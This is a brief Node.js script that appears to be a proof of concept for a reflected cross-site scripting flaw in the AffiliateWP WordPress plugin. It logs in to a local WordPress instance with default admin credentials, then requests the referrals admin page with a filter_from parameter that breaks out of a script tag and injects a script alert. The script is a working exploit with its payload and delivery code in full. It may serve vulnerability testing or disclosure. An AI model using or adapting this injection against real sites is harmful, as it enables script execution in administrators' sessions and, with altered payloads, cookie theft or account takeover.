const fetch = require('node-fetch');

const payloadURL = `http://${process.argv[2]}:${process.argv[3]}//wp-admin/admin.php?page=affiliate-wp-referrals&filter_from=%27%3C%2Fscript%3E%3Cscript%3Ealert%2842%29%3C%2Fscript%3E`;

(async () => {
  const res1 = await fetch('http://localhost:8000/wp-login.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      Cookie: 'wordpress_test_cookie=WP+Cookie+check'
    },
    body: 'log=admin&pwd=password&wp-submit=Log%20In&redirect_to=http://localhost:8000/wp-admin&testcookie=1',
    redirect: 'manual'
  });
  const cookie = await res1.headers.raw()['set-cookie'].join(';');

  const res2 = await fetch(payloadURL, {
    headers: {
      Cookie: cookie
    }
  });
  console.log(await res2.text());
})();
